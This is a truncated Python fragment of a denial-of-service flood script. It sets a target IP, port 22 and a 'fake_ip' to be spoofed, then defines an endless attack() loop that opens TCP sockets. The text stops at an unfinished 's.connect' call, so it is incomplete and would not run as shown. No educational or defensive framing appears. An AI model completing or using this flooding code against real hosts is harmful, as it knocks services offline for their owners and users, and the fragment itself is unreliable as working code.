import threading
import socket

#Below: enter actual IP instead of xxx
target = '192.168.0.102'
port = 22
fake_ip = '66.6.69.42'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect



